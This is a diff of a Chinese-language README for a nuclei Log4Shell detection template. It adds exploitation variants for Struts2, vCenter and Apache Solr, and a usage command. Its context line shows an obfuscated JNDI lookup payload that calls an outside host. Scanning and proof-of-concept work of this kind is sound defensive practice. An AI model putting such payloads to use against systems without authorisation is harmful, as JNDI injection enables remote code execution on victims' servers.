@@ -20,6 +20,22 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/p
 添加了structs2静态文件 If-Modified-Since 头利用方式。
 参考：https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg
 
+
+### structs2 利用变种
+添加了structs2利用方式变种。
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
+### vCenter 利用
+添加了vCenter利用
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
+### solr 利用
+添加了Apache solr利用
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
 # 使用
 ```
 /nuclei -t log4j-fuzz-head-poc.yaml -u http://www.test.com  -o res.txt  -rl 10 单个检测  速率为10（速率不要太高）
